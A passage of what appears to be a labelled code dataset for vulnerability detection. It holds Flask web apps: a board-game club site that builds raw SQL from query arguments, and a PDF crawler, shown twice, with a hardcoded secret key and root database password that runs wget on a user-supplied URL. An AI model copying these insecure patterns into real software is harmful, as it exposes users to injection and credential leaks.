\"\"\"Patch database resource.\n\n    Args:\n        attributes (list): list of dictionaries;\n            each dictionary is in the following format:\n            {'name': attr_name, 'value': attr_value}.\n        my_obj: instance of any of the models classes.\n    \"\"\"\n    for attribute in attributes:\n        setattr(my_obj, attribute['name'], attribute['value'])\n    db_session.add(my_obj)\n    db_session.commit()\n\n\ndef validate_api_game_query(query_dict):\n    \"\"\"Validate keys and values of the query.\n\n    Args:\n        query_dict (dict): dictionary where each key:value pair\n            represents condition-name:condition-value pair of\n            an SQL WHERE condition.\n\n    Returns:\n        bool: True if all keys and values are valid, False otherwise.\n    \"\"\"\n    args_int = ['club', 'user', 'id', 'category', 'rating-min', 'players-from',\n                'players-to', 'time-from', 'time-to', 'weight-min',\n                'weight-max']\n    args_other = ['name']\n    args_dupl = ['user', 'id', 'category']\n    for key, value in query_dict.iteritems(multi=True):\n        if(\n            # Check if any of the keys is invalid\n            key not in args_int + args_other or\n            # Check if any of the values is invalid\n            key in args_int and not value.isdigit()\n        ):\n            return False\n    # Check if there are any non-allowed key duplicates\n    for key, values in query_dict.iterlists():\n        if key not in args_dupl and len(values) > 1:\n            return False\n    # Validate players-to and players-from\n    players = ['players-from', 'players-to']\n    if not(\n        # None of the two keys is present\n        not any([x in query_dict for x in players]) or\n        # Both keys are present and ...\n        all([x in query_dict for x in players]) and\n        # ... their values are valid\n        int(query_dict['players-to']) >= int(query_dict['players-from'])\n    ):\n        return False\n    return True\n\n\ndef dicts_purge(p_dicts, *keep_keys):\n    \"\"\"Purge dictionaries of unwanted key:value pairs.\n\n    Args:\n        p_dicts (list): list of dicts to be purged.\n        *keep_keys: list of keys to be kept.\n\n    Returns:\n        List of purged dicts.\n    \"\"\"\n    for p_dict in p_dicts:\n        for key in p_dict.keys():\n            if key not in keep_keys:\n                del p_dict[key]\n    return p_dicts\n\n\ndef sql_to_dicts(*games):\n    \"\"\"Convert Game objects to dictionaries.\n\n    Each column-name:value pair in an object is converted to a\n    key:value pair in the corresponding dictionary.\n\n    Args:\n        *games: list of Game objects.\n\n    Returns:\n        list of dictionaries.\n    \"\"\"\n    sql_dicts = []\n    for game in games:\n        keys = game.__table__.columns.keys()\n        values = [getattr(game, key) for key in keys]\n        values = [float(value) if type(value) == Decimal\n                  else value for value in values]\n        sql_dicts.append(dict(zip(keys, values)))\n    return sql_dicts\n\n\ndef sign_out():\n    \"\"\"Sign out a user.\"\"\"\n    try:\n        # Revoke access token if possible\n        r = requests.post(\n            'https://accounts.google.com/o/oauth2/revoke',\n            params={'token': session['access_token']},\n            headers={'content-type': 'application/x-www-form-urlencoded'})\n        if r.status_code != 200:\n            print 'Failed to revoke access token'\n            print r.text\n        # Delete user info from session\n        del session['email']\n        del session['username']\n        del session['access_token']\n        del session['user_id']\n        del session['_csrf_token']\n        print 'Signed out'\n    except KeyError:\n        print 'Not signed in'\n        abort(401)\n\n\n##################\n# View functions #\n##################\n\n@app.route('/')\ndef home():\n    \"\"\"Return the app's main page.\"\"\"\n    club = Club.query.filter_by(id=1).scalar()\n    members = User.query.all()\n    posts = Post.query.all()\n    posts_read = make_posts_read(posts)\n    return render_template('club.html', club=club, posts=posts_read,\n                           members=members, games=club.games,\n                           owner=check_ownership())\n\n\n@app.route('/club', methods=['PATCH'])\ndef club_():\n    \"\"\"Update the Club.\"\"\"\n    club = Club.query.filter_by(id=1).scalar()\n    attributes = request.get_json()['data']['attributes']\n    patch_resource(attributes, club)\n    flash('Club info updated!')\n    return '', 204\n\n\n@app.route('/club/games/add', methods=['GET', 'POST'])\ndef club_game_add():\n    \"\"\"Create ClubGame or return page with form to do so.\n\n    Use POST and GET methods respectively.\n    \"\"\"\n    if request.method == 'GET':\n        # Show the game options matching the specified name\n        bgg_options = bgg_game_options(request.args['name'])\n        return render_template('game-options.html', games=bgg_options)\n    else:\n        # Add the chosen game to the database\n        game = check_game(request.form['bgg-id'])\n        club = Club.query.filter_by(id=1).scalar()\n        club.games.append(game)\n        db_session.add(club)\n        db_session.commit()\n        flash('Game added to the collection!')\n        return redirect(url_for('home'))\n\n\n@app.route('/club/games/<int:game_id>', methods=['DELETE'])\ndef club_game_(game_id):\n    \"\"\"Delete ClubGame.\"\"\"\n    club = Club.query.filter_by(id=1).scalar()\n    try:\n        game = Game.query.filter_by(id=game_id).one()\n    except sqlalchemy.orm.exc.NoResultFound:\n        abort(404)\n    club.games.remove(game)\n    db_session.commit()\n    clear_games(game)\n    flash('Game removed from the collection!')\n    return '', 204\n\n\n@app.route('/posts/add', methods=['GET', 'POST'])\ndef post_add():\n    \"\"\"Create Post or return page with form to do so.\n\n    Use POST and GET methods respectively.\n    \"\"\"\n    if request.method == 'GET':\n        return render_template('post-new.html')\n    else:\n        # Add Post to the database\n        post_data = {\n            'user_id': session['user_id'],\n            'subject': request.form['subject'],\n            'body': request.form['body'],\n            'posted': int(time.time())\n        }\n        post = Post(**post_data)\n        db_session.add(post)\n        db_session.commit()\n        flash('Post created!')\n        return redirect(url_for('home'))\n\n\n@app.route('/posts/<int:post_id>', methods=['PATCH', 'DELETE'])\ndef post_(post_id):\n    \"\"\"Update or Delete Post.\n\n    Use PATCH and DELETE methods respectively.\n    \"\"\"\n    post = Post.query.filter_by(id=post_id).scalar()\n    if request.method == 'PATCH':\n        # Update Post\n        attributes = request.get_json()['data']['attributes']\n        attributes.append({'name': 'edited', 'value': int(time.time())})\n        patch_resource(attributes, post)\n        flash('Post edited!')\n        return '', 204\n    else:\n        # Delete Post\n        db_session.delete(post)\n        db_session.commit()\n        flash('Post deleted!')\n        return '', 204\n\n\n@app.route('/users/<int:user_id>/new')\ndef profile_add(user_id):\n    \"\"\"Return page with form letting the user update his/her new profile.\"\"\"\n    try:\n        user = User.query.filter_by(id=user_id).one()\n    except sqlalchemy.orm.exc.NoResultFound:\n        abort(404)\n    return render_template('profile-new.html', user=user)\n\n\n@app.route('/users/<int:user_id>', methods=['GET', 'PATCH', 'DELETE'])\ndef profile_(user_id):\n    \"\"\"Return user's profile page or Update Profile or Delete Profile.\n\n    Use GET, PATCH and DELETE methods respectively.\n    \"\"\"\n    try:\n        user = User.query.filter_by(id=user_id).one()\n    except sqlalchemy.orm.exc.NoResultFound:\n        abort(404)\n    if request.method == 'GET':\n        # Return user's profile page\n        return render_template('profile.html', user=user, games=user.games,\n                               owner=check_ownership())\n    elif request.method == 'PATCH':\n        # Update Profile\n        attributes = request.get_json()['data']['attributes']\n        patch_resource(attributes, user)\n        flash('Profile updated!')\n        return '', 204\n    else:\n        # Delete Profile\n        games = user.games\n        db_session.delete(user)\n        db_session.commit()\n        clear_games(*games)\n        sign_out()\n        flash('Profile deleted!')\n        return '', 204\n\n\n@app.route('/users/<int:user_id>/games/add', methods=['GET', 'POST'])\ndef profile_game_add(user_id):\n    \"\"\"Create UserGame or return page with form to do so.\n\n    Use POST and GET methods respectively.\n    \"\"\"\n    if request.method == 'GET':\n        # Show the game options matching the specified name\n        bgg_options = bgg_game_options(request.args['name'])\n        return render_template('game-options.html', games=bgg_options)\n    else:\n        # Add the chosen game to the database\n        game = check_game(request.form['bgg-id'])\n        user = User.query.filter_by(id=user_id).scalar()\n        user.games.append(game)\n        db_session.add(user)\n        db_session.commit()\n        flash('Game added to the collection!')\n        return redirect(url_for('profile_', user_id=user_id))\n\n\n@app.route('/users/<int:user_id>/games/<int:game_id>', methods=['DELETE'])\ndef profile_game_(user_id, game_id):\n    \"\"\"Delete UserGame.\"\"\"\n    try:\n        user = User.query.filter_by(id=user_id).one()\n        game = Game.query.filter_by(id=game_id).one()\n    except sqlalchemy.orm.exc.NoResultFound:\n        abort(404)\n    user.games.remove(game)\n    db_session.commit()\n    clear_games(game)\n    flash('Game removed from the collection!')\n    return '', 204\n\n\n@app.route('/games/<int:game_id>', methods=['GET', 'POST'])\ndef game_(game_id):\n    \"\"\"Return game page or Update Game.\n\n    Use GET and POST methods respectively.\n    \"\"\"\n    try:\n        bgame = Game.query.filter_by(id=game_id).one()\n    except sqlalchemy.orm.exc.NoResultFound:\n        abort(404)\n    if request.method == 'GET':\n        # Return game page\n        return render_template('game.html', game=bgame)\n    else:\n        # Update game info from bgg API\n        game_info, bgg_categories = bgg_game_info(bgame.bgg_id)\n        for key, value in game_info.iteritems():\n            setattr(bgame, key, value)\n        bgame.categories = bgg_categories\n        db_session.commit()\n        flash('Game info updated!')\n        return redirect(url_for('game_', game_id=game_id))\n\n\n@app.route('/games/search')\ndef game_finder():\n    \"\"\"Return game-finder page.\"\"\"\n    all_categories = GameCategory.query.all()\n    games = []\n    if len(request.args) > 0:\n        # Build SQL query\n        query = ''\n        for key, value in request.args.iteritems():\n            query = game_query_builder(key, value, query)\n        query = query[:-5]\n        print query\n        # Get games satisfying the search criteria\n        game_category = int(request.args['category'])\n        if game_category == 0:\n            games = Game.query.filter(sqlalchemy.text(query)).all()\n        else:\n            # Consider game category\n            games = (Game.query.filter(sqlalchemy.text(query)).filter(\n                Game.categories.any(GameCategory.id == game_category)).all())\n    return render_template('game-finder.html', games=games,\n                           all_categories=all_categories)\n\n\n@app.route('/api/games')\ndef api_games():\n    \"\"\"Return list of games, with all their attributes, satisfying\n    the criteria provided in the request query string.\n\n    Valid query args are of two types: ownership type and game-attribute type.\n    The function first builds two sets of games, ownership set with\n    games satisfying the ownership criteria and game-attribute set with\n    games satisfying the game-attribute criteria; an intersection of\n    these two sets is then returned to the user. Specifying no criteria\n    of a given type will result in the corresponding set with all\n    the games in the database.\n\n    Valid arguments are as follows:\n        ownership type:\n            club=1: include all games owned by the club\n            user=INTEGER: include all games owned by the user,\n                value denotes user id,\n                multiple args=YES\n        game-attribute type:\n            id=INTEGER: value denotes game id,\n                multiple args=YES\n            name=NAME\n            category=INTEGER: value denotes category id,\n                multiple args=YES\n            rating-min=[1-10]\n            players-from=INTEGER: query must also include players-to\n            players-to=INTEGER: query must also include players-from\n            time-from=INTEGER\n            time-to=INTEGER\n            weight-min=[1-5]\n            weight-max=[1-5]\n\n    The response is in JSON.\n    \"\"\"\n    if not validate_api_game_query(request.args):\n        return error_response(\n            'One or more query parameters have invalid key and/or value', 400)\n    # Club filter\n    games_club = []\n    if request.args.get('club') == '1':\n        games_club = db_session.query(clubs_games_assoc).all()\n        games_club = [club_game.game_id for club_game in games_club]\n    print 'games_club', games_club\n    # User filter\n    users = [int(user_id) for user_id in request.args.getlist('user')]\n    games_users = db_session.query(users_games_assoc).filter(\n        users_games_assoc.c.user_id.in_(users)).all()\n    games_users = [game.game_id for game in games_users]\n    print 'games_user', games_users\n    # Game attribute filter\n    query = ''\n    for key, value in request.args.iteritems(multi=True):\n        query = game_query_builder(key, value, query)\n    query = query[:-5]\n    categories = request.args.getlist('category')\n    if len(categories) == 0:\n        attr_games = Game.query.filter(sqlalchemy.text(query)).all()\n    else:\n        # Consider game categories\n        attr_games = (Game.query.filter(sqlalchemy.text(query)).filter(\n            Game.categories.any(GameCategory.id.in_(categories))).all())\n    attr_games = [game.id for game in attr_games]\n    print 'games_query', attr_games\n    # Union of club and user games\n    owned_games = set(games_club) | set(games_users)\n    print 'union', owned_games\n    # Intersection of owned_games and attr_games\n    games_id = ((set(attr_games) & owned_games)\n                if len(owned_games) > 0 else set(attr_games))\n    print 'intersection', games_id\n    # Get all games satisfying the search criteria\n    games = Game.query.filter(Game.id.in_(games_id)).all()\n    games_dict = sql_to_dicts(*games)\n    # Add category info to each game_dict\n    games_categories = {}\n    for game in games:\n        games_categories[game.id] = [game_category.name for game_category in\n                                     game.categories]\n    for game_dict in games_dict:\n        game_dict['category'] = games_categories[game_dict['id']]\n    return jsonify(games=games_dict)\n\n\n@app.route('/api/info')\ndef api_info():\n    \"\"\"Return basic information on all sql entries of chosen types.\n\n    Valid query args:\n        users=1\n        categories=1\n        games=1\n\n    The response is in JSON.\n    \"\"\"\n    d = {\n        'users': User.query.all(),\n        'categories': GameCategory.query.all(),\n        'games': Game.query.all()\n    }\n    info = {}\n    for key, value in request.args.iteritems():\n        if d.get(key) and value == '1':\n            sql_all_dict = sql_to_dicts(*d[key])\n            info[key] = dicts_purge(sql_all_dict,\n                                    *['id', 'name', 'year_published'])\n    return jsonify(**info)\n\n\n@app.route('/gconnect', methods=['POST'])\ndef g_connect():\n    \"\"\"Sign in user.\"\"\"\n    # Additional csrf check\n    if not request.headers.get('X-Requested-With'):\n        abort(403)\n    # Get one-time code from the end-user\n    auth_code = request.get_json().get('auth_code')\n    # Exchange one-time code for id_token and access_token\n    try:\n        credentials = client.credentials_from_clientsecrets_and_code(\n            app.config['CLIENT_SECRET_FILE'],\n            ['https://www.googleapis.com/auth/drive.appdata', 'profile',\n             'email'],\n            auth_code)\n    except client.FlowExchangeError:\n        return error_response('Failed to upgrade one-time authorization code.',\n                              401)\n    # Validate id_token\n    if not validate_id_token(credentials.id_token, credentials.id_token_jwt):\n        return error_response('id token is not valid', 500)\n    # Get user info from access token\n    userinfo_url = \"https://www.googleapis.com/oauth2/v1/userinfo\"\n    params = {'access_token': credentials.access_token, 'alt': 'json'}\n    answer = requests.get(userinfo_url, params=params)\n    user_data = answer.json()\n    # Store user info in the session for later use\n    session['email'] = credentials.id_token['email']\n    session['username'] = user_data['name']\n    session['access_token'] = credentials.access_token\n    # If the user does not exist, add him to the database\n    session['user_id'], new_user = check_user(\n        session['email'], session['username'],  user_data['picture'])\n    # Response\n    body = {'username': user_data['name'],\n            'user_id': session['user_id'],\n            'new_user': new_user}\n    return json_response(body, 200)\n\n\n@app.route('/gdisconnect', methods=['POST'])\ndef g_disconnect():\n    \"\"\"Sign out user.\"\"\"\n    sign_out()\n    flash('Signed out!')\n    return '', 204\n/n/n/n", "label": 1}, {"id": "4bad3673debf0b9491b520f0e22e9186af78c375", "code": "bar.py/n/nimport subprocess\nimport shlex\nimport os\nimport signal\nfrom helper import path_dict, path_number_of_files, pdf_stats, pdf_date_format_to_datetime\nimport json\nfrom functools import wraps\nfrom urllib.parse import urlparse\n\nfrom flask import Flask, render_template, flash, redirect, url_for, session, request, logging\nfrom flask_mysqldb import MySQL\nfrom wtforms import Form, StringField, TextAreaField, PasswordField, validators\nfrom passlib.hash import sha256_crypt\nimport time\n\napp = Flask(__name__)\napp.secret_key = 'Aj\"$7PE#>3AC6W]`STXYLz*[G\\gQWA'\n\n\n# Config MySQL\napp.config['MYSQL_HOST'] = 'localhost'\napp.config['MYSQL_USER'] = 'root'\napp.config['MYSQL_PASSWORD'] = 'mountain'\napp.config['MYSQL_DB'] = 'bar'\napp.config['MYSQL_CURSORCLASS'] = 'DictCursor'\n\n# init MySQL\nmysql = MySQL(app)\n\n# CONSTANTS\nWGET_DATA_PATH = 'data'\nPDF_TO_PROCESS = 10\nMAX_CRAWLING_DURATION = 60 # 15 minutes\nWAIT_AFTER_CRAWLING = 1000\n\n\n# Helper Function\n\n# Check if user logged in\ndef is_logged_in(f):\n    @wraps(f)\n    def wrap(*args, **kwargs):\n        if 'logged_in' in session:\n            return f(*args, **kwargs)\n        else:\n            flash('Unauthorized, Please login', 'danger')\n            return redirect(url_for('login'))\n    return wrap\n\n\n# Index\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'POST': #FIXME I didn't handle security yet !! make sure only logged-in people can execute\n\n        # User can type in url\n        # The url will then get parsed to extract domain, while the crawler starts at url.\n\n        # Get Form Fields and save\n        url = request.form['url']\n        parsed = urlparse(url)\n\n        session['domain'] = parsed.netloc\n        session['url'] = url\n\n        # TODO use WTForms to get validation\n\n        return redirect(url_for('crawling'))\n\n    return render_template('home.html')\n\n\n# Crawling\n@app.route('/crawling')\n@is_logged_in\ndef crawling():\n    # STEP 0: TimeKeeping\n    session['crawl_start_time'] = time.time()\n\n    # STEP 1: Prepare WGET command\n    url = session.get('url', None)\n\n    command = shlex.split(\"timeout %d wget -r -A pdf %s\" % (MAX_CRAWLING_DURATION, url,)) #FIXME timeout remove\n    #command = shlex.split(\"wget -r -A pdf %s\" % (url,))\n\n    #TODO use celery\n    #TODO give feedback how wget is doing\n\n    #TODO https://stackoverflow.com/questions/15041620/how-to-continuously-display-python-output-in-a-webpage\n\n    # STEP 2: Execute command in subdirectory\n    process = subprocess.Popen(command, cwd=WGET_DATA_PATH)\n    session['crawl_process_id'] = process.pid\n\n    return render_template('crawling.html', max_crawling_duration=MAX_CRAWLING_DURATION)\n\n\n# End Crawling Manual\n@app.route('/crawling/end')\n@is_logged_in\ndef end_crawling():\n\n    # STEP 1: Kill crawl process\n    p_id = session.get('crawl_process_id', None)\n    os.kill(p_id, signal.SIGTERM)\n\n    session['crawl_process_id'] = -1\n\n    # STEP 2: TimeKeeping\n    crawl_start_time = session.get('crawl_start_time', None)\n    session['crawl_total_time'] = time.time() - crawl_start_time\n\n    # STEP 3: Successful interruption\n    flash('You successfully interrupted the crawler', 'success')\n\n    return render_template('end_crawling.html')\n\n\n# End Crawling Automatic\n@app.route('/crawling/autoend')\n@is_logged_in\ndef autoend_crawling():\n\n    # STEP 0: Check if already interrupted\n    p_id = session.get('crawl_process_id', None)\n    if p_id < 0:\n        return \"process already killed\"\n    else:\n        # STEP 1: Kill crawl process\n        os.kill(p_id, signal.SIGTERM)\n\n        # STEP 2: TimeKeeping\n        crawl_start_time = session.get('crawl_start_time', None)\n        session['crawl_total_time'] = time.time() - crawl_start_time\n\n        # STEP 3: Successful interruption\n        flash('Time Limit reached - Crawler interrupted automatically', 'success')\n\n        return redirect(url_for(\"table_detection\"))\n\n\n# Start table detection\n@app.route('/table_detection')\n@is_logged_in\ndef table_detection():\n    return render_template('table_detection.html', wait=WAIT_AFTER_CRAWLING)\n\n\n# About\n@app.route('/about')\ndef about():\n    return render_template('about.html')\n\n\n# PDF processing\n@app.route('/processing')\n@is_logged_in\ndef processing():\n\n    # STEP 0: Time keeping\n    proc_start_time = time.time()\n\n    domain = session.get('domain', None)\n    if domain == None:\n        pass\n        # TODO think of bad cases\n\n    path = \"data/%s\" % (domain,)\n\n    # STEP 1: Call Helper function to create Json string\n\n    # FIXME workaround to weird file system bug with latin/ cp1252 encoding..\n    # https://stackoverflow.com/questions/35959580/non-ascii-file-name-issue-with-os-walk works\n    # https://stackoverflow.com/questions/2004137/unicodeencodeerror-on-joining-file-name doesn't work\n    hierarchy_dict = path_dict(path)  # adding ur does not work as expected either\n    hierarchy_json = json.dumps(hierarchy_dict, sort_keys=True, indent=4)  # , encoding='cp1252' not needed in python3\n\n    # FIXME remove all session stores\n\n    # STEP 2: Call helper function to count number of pdf files\n    n_files = path_number_of_files(path)\n    session['n_files'] = n_files\n\n    # STEP 3: Extract tables from pdf's\n    stats, n_error, n_success = pdf_stats(path, PDF_TO_PROCESS)\n\n    # STEP 4: Save stats\n    session['n_error'] = n_error\n    session['n_success'] = n_success\n    stats_json = json.dumps(stats, sort_keys=True, indent=4)\n    session['stats'] = stats_json\n\n    # STEP 5: Time Keeping\n    proc_over_time = time.time()\n    proc_total_time = proc_over_time - proc_start_time\n\n    # STEP 6: Save query in DB\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Execute query\n    cur.execute(\"\"\"INSERT INTO Crawls(cid, crawl_date, pdf_crawled, pdf_processed, process_errors, domain, url, hierarchy, \n                stats, crawl_total_time, proc_total_time) VALUES(NULL, NULL, %s ,%s, %s, %s, %s, %s, %s, %s, %s)\"\"\",\n                (n_files, n_success, n_error, domain, session.get('url', None), hierarchy_json,\n                stats_json, session.get('crawl_total_time', None), proc_total_time))\n\n    # Commit to DB\n    mysql.connection.commit()\n\n    # Close connection\n    cur.close()\n\n    return render_template('processing.html', n_files=n_success, domain=domain, cid=0)\n\n# Last Crawl Statistics\n@app.route('/statistics')\n@is_logged_in\ndef statistics():\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Get user by username\n    cur.execute(\"\"\"SELECT cid FROM Crawls WHERE crawl_date = (SELECT max(crawl_date) FROM Crawls)\"\"\")\n\n    result = cur.fetchone()\n\n    # Close connection\n    cur.close()\n\n    if result:\n        cid_last_crawl = result[\"cid\"]\n        return redirect(url_for(\"cid_statistics\", cid=cid_last_crawl))\n    else:\n        flash(\"There are no statistics to display, please start a new query and wait for it to complete.\", \"danger\")\n        return redirect(url_for(\"index\"))\n\n\n# CID specific Statistics\n@app.route('/statistics/<int:cid>')\n@is_logged_in\ndef cid_statistics(cid):\n\n    # STEP 1: retrieve all saved stats from DB\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    result = cur.execute(\"\"\"SELECT * FROM Crawls WHERE cid = %s\"\"\", (cid,))\n    crawl = cur.fetchall()[0]\n\n    # Close connection\n    cur.close();\n\n    print(session.get('stats', None))\n    print(crawl['stats'])\n\n    # STEP 2: do some processing to retrieve interesting info from stats\n    json_stats = json.loads(crawl['stats'])\n    json_hierarchy = json.loads(crawl['hierarchy'])\n\n    stats_items = json_stats.items()\n    n_tables = sum([subdict['n_tables_pages'] for filename, subdict in stats_items])\n    n_rows = sum([subdict['n_table_rows'] for filename, subdict in stats_items])\n\n    medium_tables = sum([subdict['table_sizes']['medium'] for filename, subdict in stats_items])\n    small_tables = sum([subdict['table_sizes']['small'] for filename, subdict in stats_items])\n    large_tables = sum([subdict['table_sizes']['large'] for filename, subdict in stats_items])\n\n    # Find some stats about creation dates\n    creation_dates_pdf = [subdict['creation_date'] for filename, subdict in stats_items]\n    creation_dates = list(map(lambda str : pdf_date_format_to_datetime(str), creation_dates_pdf))\n\n    if len(creation_dates) > 0:\n        oldest_pdf = min(creation_dates)\n        most_recent_pdf = max(creation_dates)\n    else:\n        oldest_pdf = \"None\"\n        most_recent_pdf = \"None\"\n\n    return render_template('statistics.html', n_files=crawl['pdf_crawled'], n_success=crawl['pdf_processed'],\n                           n_tables=n_tables, n_rows=n_rows, n_errors=crawl['process_errors'], domain=crawl['domain'],\n                           small_tables=small_tables, medium_tables=medium_tables,\n                           large_tables=large_tables, stats=json_stats, hierarchy=json_hierarchy,\n                           end_time=crawl['crawl_date'], crawl_total_time=round(crawl['crawl_total_time'] / 60.0, 1),\n                           proc_total_time=round(crawl['proc_total_time'] / 60.0, 1),\n                           oldest_pdf=oldest_pdf, most_recent_pdf=most_recent_pdf)\n\n\nclass RegisterForm(Form):\n    name = StringField('Name', [validators.Length(min=1, max=50)])\n    username = StringField('Username', [validators.Length(min=4, max=25)])\n    email = StringField('Email', [validators.Length(min=6, max=50)])\n    password = PasswordField('Password', [validators.DataRequired(),\n                                          validators.EqualTo('confirm', message='Passwords do not match')])\n    confirm = PasswordField('Confirm Password')\n\n\n# Register\n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    form = RegisterForm(request.form)\n    if request.method == 'POST' and form.validate():\n        name = form.name.data\n        email = form.email.data\n        username = form.username.data\n        password = sha256_crypt.encrypt(str(form.password.data))\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Execute query\n        cur.execute(\"INSERT INTO Users(name, email, username, password) VALUES(%s, %s, %s, %s)\",\n                    (name, email, username, password))\n\n        # Commit to DB\n        mysql.connection.commit()\n\n        # Close connection\n        cur.close()\n\n        flash('You are now registered and can log in', 'success')\n\n        return redirect(url_for('login'))\n\n    return render_template('register.html', form=form)\n\n\n# User login\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        # Get Form Fields\n        username = request.form['username']\n        password_candidate = request.form['password']\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Get user by username\n        result = cur.execute(\"\"\"SELECT * FROM Users WHERE username = %s\"\"\", [username])\n\n        # Note: apparently this is safe from SQL injections see\n        # https://stackoverflow.com/questions/7929364/python-best-practice-and-securest-to-connect-to-mysql-and-execute-queries/7929438#7929438\n\n        if result > 0:\n            # Get stored hash\n            data = cur.fetchone() # FIXME why is username not primary key\n            password = data['password']\n\n            # Compare passwords\n            if sha256_crypt.verify(password_candidate, password): # FIXME how does sha256 work?\n\n                # Check was successful -> create session variables\n                session['logged_in'] = True\n                session['username'] = username\n\n                flash('You are now logged in', 'success')\n                return redirect(url_for('index'))\n            else:\n                error = 'Invalid login'\n                return render_template('login.html', error=error)\n\n        else:\n            error = 'Username not found'\n            return render_template('login.html', error=error)\n\n        # Close connection\n        cur.close() # FIXME shouldn't that happen before return?\n\n    return render_template('login.html')\n\n\n# Delete Crawl\n@app.route('/delete_crawl', methods=['POST'])\n@is_logged_in\ndef delete_crawl():\n\n        # Get Form Fields\n        cid = request.form['cid']\n\n        # Create cursor\n        cur = mysql.connection.cursor()\n\n        # Get user by username\n        result = cur.execute(\"\"\"DELETE FROM Crawls WHERE cid = %s\"\"\" (cid,))\n\n        # Commit to DB\n        mysql.connection.commit()\n\n        # Close connection\n        cur.close()\n\n        # FIXME check if successfull first, return message\n        flash('Crawl successfully removed', 'success')\n\n        return redirect(url_for('dashboard'))\n\n\n# Logout\n@app.route('/logout')\n@is_logged_in\ndef logout():\n    session.clear()\n    flash('You are now logged out', 'success')\n    return redirect(url_for('login'))\n\n\n# Dashboard\n@app.route('/dashboard')\n@is_logged_in\ndef dashboard():\n\n    # Create cursor\n    cur = mysql.connection.cursor()\n\n    # Get Crawls\n    result = cur.execute(\"\"\"SELECT cid, crawl_date, pdf_crawled, pdf_processed, domain, url FROM Crawls\"\"\")\n\n    crawls = cur.fetchall()\n\n    if result > 0:\n        return render_template('dashboard.html', crawls=crawls)\n    else:\n        msg = 'No Crawls Found'\n        return render_template('dashboard.html', msg=msg)\n\n    # Close connection FIXME is this code executed\n    cur.close()\n\n\nif __name__ == '__main__':\n    app.secret_key='Aj\"$7PE#>3AC6W]`STXYLz*[G\\gQWA'\n    app.run(debug=True)\n    #app.run(host='0.0.0.0')\n\n/n/n/n", "label": 0}, {"id": "4bad3673debf0b9491b520f0e22e9186af78c375", "code": "/bar.py/n/nimport subprocess\nimport shlex\nimport os\nimport signal\nfrom helper import path_dict, path_number_of_files, pdf_stats, pdf_date_format_to_datetime\nimport json\nfrom functools import wraps\nfrom urllib.parse import urlparse\n\nfrom flask import Flask, render_template, flash, redirect, url_for, session, request, logging\nfrom flask_mysqldb import MySQL\nfrom wtforms import Form, StringField, TextAreaField, PasswordField, validators\nfrom passlib.hash import sha256_crypt\nimport time\n\napp = Flask(__name__)\napp.secret_key = 'Aj\"$7PE#>3AC6W]`STXYLz*[G\\gQWA'\n\n\n# Config MySQL\napp.config['MYSQL_HOST'] = 'localhost'\napp.config['MYSQL_USER'] = 'root'\napp.config['MYSQL_PASSWORD'] = 'mountain'\napp.config['MYSQL_DB'] = 'bar'\napp.config['MYSQL_CURSORCLASS'] = 'DictCursor'\n\n# init MySQL\nmysql = MySQL(app)\n\n# CONSTANTS\nWGET_DATA_PATH = 'data'\nPDF_TO_PROCESS = 10\nMAX_CRAWLING_DURATION = 60 # 15 minutes\nWAIT_AFTER_CRAWLING = 1000\n\n\n# Helper Function\n\n# Check if user logged in\ndef is_logged_in(f):\n    @wraps(f)\n    def wrap(*args, **kwargs):\n        if 'logged_in' in session:\n            return f(*args, **kwargs)\n        else:\n            flash('Unauthorized, Please login', 'danger')\n            return redirect(url_for('login'))\n    return wrap\n\n\n# Index\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'POST': #FIXME I didn't handle security yet !! make sure only logged-in people can execute\n\n        # User can type in url\n        # The url will then get parsed to extract domain, while the crawler starts at url.\n\n        # Get Form Fields and save\n        url = request.form['url']\n        parsed = urlparse(url)\n\n        session['domain'] = parsed.netloc\n        session['url'] = url\n\n        # TODO use WTForms to get validation\n\n        return redirect(url_for('crawling'))\n\n    return render_template('home.html')\n\n\n# Crawling\n@app.route('/crawling')\n@is_logged_in\ndef crawling():\n    # STEP 0: TimeKeeping\n    session['crawl_start_time'] = time.time()\n\n    # STEP 1: Prepare WGET command\n    url = session.get('url', None)\n\n    command = shlex.split(\"timeout %d wget -r -A pdf %s\" % (MAX_CRAWLING_DURATION, url,)) #FIXME timeout remove\n    #command = shlex.split(\"wget -r -A pdf %s\" % (url,))\n\n    #TODO use celery\n    #TODO give feedback how wget is doing\n\n    #TODO https://stackoverflow.com/questions/15041620/how-to-continuously-display-python-output-in-a-webpage\n\n    # STEP 2: Execute command in subdirectory\n    process = subprocess.Popen(command, cwd=WGET_DATA_PATH)\n    session['crawl_process_id'] = process.pid\n\n    return render_template('crawling.html', max_crawling_duration=MAX_CRAWLING_DURATION)\n\n\n# End Crawling Manual\n@app.route('/crawling/end')\n@is_logged_in\ndef end_crawling():\n\n    # STEP 1: Kill crawl process\n    p_id = session.get('crawl_process_id', None)\n    os.kill(p_id, signal.SIGTERM)\n\n    session['crawl_process_id'] = -1\n\n    # STEP 2: TimeKeeping\n    crawl_start_time = session.get('crawl_start_time', None)\n    session['crawl_total_time'] = time.time() - crawl_start_time\n\n    # STEP 3: Successful interruption\n    flash('You successfully interrupted the crawler', 'success')\n\n    return render_template('end_crawling.html')\n\n\n# End Crawling Automatic\n@app.route('/crawling/autoend')\n@is_logged_in\ndef autoend_crawling():\n\n    # STEP 0: Check if already interrupted\n    p_id = session.get('crawl_process_id', None)\n    if p_id < 0:\n        return \"process already killed\"\n    else:\n        # STEP 1: Kill crawl process\n        os.kill(p_id, signal.SIGTERM)\n\n        # STEP 2: TimeKeeping\n        crawl_start_time = session.get('crawl_start_time', None)\n        session['crawl_total_time'] = time.time() - crawl_start_time\n\n        # STEP 3: Successful interruption\n        flash('Time Limit reached - Crawler interrupted automatically', 'success')\n\n        return redirect(url_for(\"table_detection\"))\n\n\n# Start table detection\n@app.route('/table_detection')\n@is_logged_in\ndef table_detection():\n    return render_template('table_detection.html', wait=WAIT_AFTER_CRAWLING)\n\n\n# About\n@app.route('/about')\ndef about():\n    return render_template('about.html')\n\n\n# PDF processing\n@app.route('/processing')\n@is_logged_in\ndef processing():\n\n    # STEP 